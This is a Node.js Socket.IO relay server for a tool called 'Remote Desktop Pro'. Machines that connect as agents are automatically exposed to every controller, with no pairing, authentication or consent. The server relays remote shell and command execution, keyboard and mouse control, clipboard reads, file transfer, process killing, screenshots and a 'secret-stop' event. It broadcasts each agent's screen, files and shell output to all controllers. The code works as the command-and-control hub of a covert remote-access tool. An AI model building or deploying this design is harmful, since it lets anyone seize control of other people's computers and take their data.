/**
 * Remote Desktop Pro - Cloud Relay Server
 * NO PAIRING CODES - Automatic Discovery!
 * 
 * Agents connect and are automatically visible to all controllers.
 * Controllers see all connected agents and can control any of them.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10 * 1024 * 1024, // 10MB for screen frames
  pingTimeout: 60000,
  pingInterval: 25000
});

// Store connected devices - Simple!
const agents = new Map();      // agentId -> { socket, info }
const controllers = new Map(); // controllerId -> { socket }

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    agents: agents.size,
    controllers: controllers.size,
    uptime: process.uptime()
  });
});

// API to get all agents
app.get('/agents', (req, res) => {
  const agentList = [];
  agents.forEach((agent, id) => {
    agentList.push({
      id,
      hostname: agent.info?.hostname,
      username: agent.info?.username,
      platform: agent.info?.platform,
      connected: agent.socket.connected
    });
  });
  res.json(agentList);
});

console.log('═'.repeat(50));
console.log('  REMOTE DESKTOP PRO - CLOUD RELAY');
console.log('  Auto-Discovery Mode (No Pairing Codes)');
console.log('═'.repeat(50));

io.on('connection', (socket) => {
  console.log(`[CONNECT] ${socket.id}`);
  
  // ============ CONTROLLER EVENTS ============
  
  // Controller registers - immediately gets list of all agents
  socket.on('controller:register', (info) => {
    const controllerId = socket.id;
    
    controllers.set(controllerId, {
      socket,
      info
    });
    
    console.log(`[CONTROLLER] Registered: ${controllerId}`);
    
    socket.emit('controller:registered', { 
      controllerId,
      message: 'Connected! Showing all available agents.'
    });
    
    // Send list of all connected agents
    sendAgentListToController(socket);
  });
  
  // Controller requests agent list refresh
  socket.on('controller:refresh', () => {
    sendAgentListToController(socket);
  });
  
  // Controller wants to connect to specific agent
  socket.on('controller:connect-agent', (agentId) => {
    const agent = agents.get(agentId);
    if (agent && agent.socket.connected) {
      console.log(`[RELAY] Controller connecting to agent ${agentId}`);
      socket.emit('controller:agent-connected', { agentId });
    } else {
      socket.emit('controller:agent-error', { error: 'Agent not found or offline' });
    }
  });
  
  // ============ AGENT EVENTS ============
  
  // Agent registers - no code needed!
  socket.on('agent:register', (data) => {
    const { info } = data;
    const agentId = socket.id;
    
    agents.set(agentId, {
      socket,
      info
    });
    
    console.log(`[AGENT] Registered: ${info?.hostname} (${agentId})`);
    
    socket.emit('agent:registered', { 
      agentId,
      message: 'Connected! Controllers can now see you.'
    });
    
    // Notify ALL controllers that a new agent is available
    controllers.forEach((controller) => {
      if (controller.socket.connected) {
        controller.socket.emit('controller:agent-joined', {
          id: agentId,
          hostname: info?.hostname,
          username: info?.username,
          platform: info?.platform,
          screens: info?.screens
        });
      }
    });
  });
  
  // ============ RELAY ALL CONTROL EVENTS ============
  
  // From Controller to Agent
  const controlEvents = [
    'control:start-stream', 'control:stop-stream', 'control:set-quality', 'control:set-monitor',
    'control:mouse', 'control:keyboard', 'control:scroll',
    'control:clipboard-set', 'control:clipboard-get',
    'control:file-list', 'control:file-download', 'control:file-upload',
    'control:system-info', 'control:processes', 'control:kill-process',
    'control:command', 'control:shell', 'control:message',
    'control:secret-stop', 'control:get-agent-status',
    'control:lock-screen', 'control:screenshot'
  ];
  
  controlEvents.forEach(event => {
    socket.on(event, (data) => {
      const targetAgentId = data?.agentId || data?.targetAgent;
      if (targetAgentId) {
        const agent = agents.get(targetAgentId);
        if (agent && agent.socket.connected) {
          console.log(`[RELAY] ${event} -> ${targetAgentId}`);
          agent.socket.emit(event, data);
        }
      }
    });
  });
  
  // From Agent to Controller (broadcast to all controllers)
  const agentEvents = [
    'agent:frame', 'agent:clipboard', 'agent:file-list', 'agent:file-download', 
    'agent:file-upload', 'agent:system-info', 'agent:processes', 
    'agent:kill-process', 'agent:shell', 'agent:heartbeat', 'agent:screenshot'
  ];
  
  agentEvents.forEach(event => {
    socket.on(event, (data) => {
      // Only log non-frame events to avoid spam
      if (event !== 'agent:frame') {
        console.log(`[RELAY] ${event} from ${socket.id}`);
      }
      
      // Broadcast to all controllers
      controllers.forEach((controller) => {
        if (controller.socket.connected) {
          controller.socket.emit(event, { ...data, agentId: socket.id });
        }
      });
    });
  });
  
  // ============ DISCONNECT ============
  
  socket.on('disconnect', () => {
    // Check if it was an agent
    if (agents.has(socket.id)) {
      const agent = agents.get(socket.id);
      
      // Notify all controllers
      controllers.forEach((controller) => {
        if (controller.socket.connected) {
          controller.socket.emit('controller:agent-left', { 
            agentId: socket.id,
            hostname: agent.info?.hostname
          });
        }
      });
      
      agents.delete(socket.id);
      console.log(`[AGENT] Disconnected: ${agent.info?.hostname || socket.id}`);
    }
    
    // Check if it was a controller
    if (controllers.has(socket.id)) {
      controllers.delete(socket.id);
      console.log(`[CONTROLLER] Disconnected: ${socket.id}`);
    }
  });
});

// Helper function to send agent list
function sendAgentListToController(socket) {
  const agentList = [];
  agents.forEach((agent, id) => {
    if (agent.socket.connected) {
      agentList.push({
        id,
        hostname: agent.info?.hostname,
        username: agent.info?.username,
        platform: agent.info?.platform,
        screens: agent.info?.screens
      });
    }
  });
  socket.emit('controller:agent-list', agentList);
}

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`  Relay running on port ${PORT}`);
  console.log('  Agents will auto-register when they connect');
  console.log('  Controllers will see all connected agents');
  console.log('═'.repeat(50));
});
